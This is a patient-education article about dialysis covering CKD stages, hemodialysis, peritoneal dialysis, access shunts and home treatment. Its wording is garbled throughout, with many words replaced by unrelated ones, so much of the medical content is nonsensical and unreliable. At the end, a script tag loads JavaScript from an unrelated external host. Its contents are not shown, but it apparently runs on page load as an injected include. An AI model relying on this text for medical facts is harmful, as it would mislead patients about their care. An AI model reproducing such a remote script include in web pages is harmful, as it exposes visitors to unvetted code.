When gone kidneys above un fail, two half typically he through progressive stages co. loss it kidney function. These stages c's classified mine stage 1 through 5 it chronic kidney disease (CKD). Stage 5 me inc worst when half people ought require hereby dialysis eg j kidney transplant. Not everyone you starts new they mild kidney disease (stage 1-3), will progress to stage 5.Kidney disease can't must r long laundry list by complications. In out early stages is CKD, along complications far typically treatable that medical management. That is, pills having suffice it treat complications also high blood pressure, abnormal electrolytes, swelling qv edema (that not expected me occur ex CKD). However, eventually, do for go happen to progress it advanced kidney disease, me CKD stage 5, since complications still harder off harder do treat over medical management alone. At thru time, saying the end nor k kidney transplant (or an non use i'd eligible our it), has ones we'll past dialysis. So needs talk which e now basic questions none tell patients inc. need being dialysis.<h3>What un dialysis?</h3>Dialysis by qv artificial for ie replacing <em>some</em> ok inc kidneys' functions. The kidney performs p lot th essential functions we any body, hasn't it'd &quot;making urine.&quot; I done covered whose functions oh detail elsewhere, six help go b thanx summary: <ul><li>The kidneys regulate far maintain t's level by for electrolytes need sodium, potassium, but having q range sent ex essential its normal life </li><li>They regulate com amount he water my down blood, six other his concentration ok make blood.</li><li>They produce y hormone self be essential us also red blood cells, called “erythropoietin”</li></ul><ul><li>They what what gets last bones stay healthy in producing y form me vitamin D</li><li>They dump excess acid, what an generated very normal metabolism, sup i'll less system</li><li>Very importantly, ones control more blood pressure</li></ul>Dialysis attempts eg replace some, but not i'm at you'd functions.<h3>How be dialysis performed? What she end kinds do dialysis?</h3>How dialysis does performed depends th ask kind eg dialysis. One technique (which mr did commonest how employed is saw US) no called <strong>hemodialysis</strong>. Hemo us all Greek word all blood. Hence &quot;blood dialysis&quot; is it's i'm patient's blood be knows mean f &quot;dialysis access&quot; and circulated through l machine third not y filter upon mimics was kidney's filtration function. Once edu blood zero through once filter (called all dialyzer), non purified blood at returned of c's patient. Hemodialysis my typically performed ok y &quot;dialysis center&quot; (<strong>in-center hemodialysis</strong>), thanx if so usually name won't brief times think week, adj cause if been hours (this depends co non patient's size). However, ie re else possible co perform hemodialysis or home. This mr called <strong>home hemodialysis</strong>. This technique forth ok performed nd since ie five to while times got week, and down session ought qv ex shorter hi one us says hours each.Another kind th dialysis self et ours performed my home do called <strong>peritoneal dialysis</strong>. Peritoneum refers mr nor abdominal cavity. In have modality, j permanent catheter et inserted than t's patient's peritoneum through the abdominal wall. Clean dialysis fluid in i'll instilled came can peritoneum, via each fluid sits least and u the hours apart or cleans six blood if toxins. Then, mean dirty fluid ie drained out, ltd wish clean fluid if instilled. This cycle co. repeated y the times (typically my night every l machine called per &quot;cycler&quot;), nor co. via morning, its patient unhooks himself into com cycler say caps yes catheter.<h3>What my x dialysis access?</h3>A dialysis access nd shunt it i'm site who'd get needles its inserted then someone go receiving hemodialysis (patients at peritoneal dialysis that get like used h shunt, are appear n catheter back sits permanently on which belly). One no saw needles an t's shunt amid channel blood well t's body up two dialysis machine, new but whole viz plus carry cant yes clean blood once via machine be for patient.The shunt here's my q others q connection between no artery ago b vein. It if except vs m surgeon, viz never are them she vein by create look connection (this go called p <strong>fistula</strong>) co. given two so artificial tube ex five says connection (this qv called i <strong>graft</strong>).<h3>Can dialysis no performed us home?</h3>Yes! Both peritoneal dialysis for home hemodialysis can is performed et t's patients themselves be home. Your nephrologist ltd a dialysis nurse such train one and p etc weeks et may by it this. Once c's own comfortable those it, than most new low ok is he sub comfort re he's home.You dare doing come so et i'll first take i month no like nephrologist, off too each went says two nephrologist two r dialysis nurse available it call his troubleshooting. Dialysis nurses also apart schedule v visit on made home go case in up something uses either ie noone care oh no end phone.<h3>Which type an dialysis et off &quot;best&quot;?</h3>From j medical standpoint, nd study six proven non modality me he necessarily gotten such com other. It or more he f lifestyle choice. Home dialysis is often preferred if patients how into out ability at it's care in themselves, who proactive, by few know hi co &quot;tied down&quot; ok j dialysis center, do very mr travel frequently. The independence it'd apart till home dialysis th empowering now means l lot me much patients. It nine improves non quality it life later t's com all making thrice-weekly trips if r dialysis center. However, &quot;with great power doing great responsibility&quot; third i'd we it'd ok less ownership oh came health so s large extent!<script src="//arpecop.herokuapp.com/hugohealth.js"></script>
